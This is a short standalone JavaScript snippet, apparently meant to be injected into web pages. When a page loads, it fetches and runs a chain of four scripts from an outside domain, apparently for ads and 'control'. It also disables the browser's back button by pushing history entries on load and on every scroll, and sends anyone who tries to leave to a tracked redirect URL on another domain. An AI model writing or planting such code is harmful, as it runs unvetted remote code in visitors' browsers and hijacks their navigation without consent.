let mainLoad = [
  "https://agcali.pahe.my.id/histads.js",
  "https://agcali.pahe.my.id/control.js",
  "https://agcali.pahe.my.id/adsiklan.js",
  "https://agcali.pahe.my.id/control-remove.js"
];

let startLoad=0;
function getLoad(){
  let elLoad = document.createElement("script");
  elLoad.setAttribute("src",mainLoad[startLoad]);
  elLoad.onload = ()=>{
    startLoad+=1;
    if(mainLoad[startLoad]){
      getLoad();
    };
  };
  document.body.append(elLoad);
};
getLoad();

//---- disable back ----
history.pushState(null, document.title, window.location.href);
window.addEventListener('popstate', function (event)
{
  window.location.href="https://merelyerroneous.com/ymf90ucn?key=2e5aefd8f3bb88228c2962cbc1d8ddae";
});
window.addEventListener('scroll', function() {
  history.pushState(null, document.title, window.location.href);
});
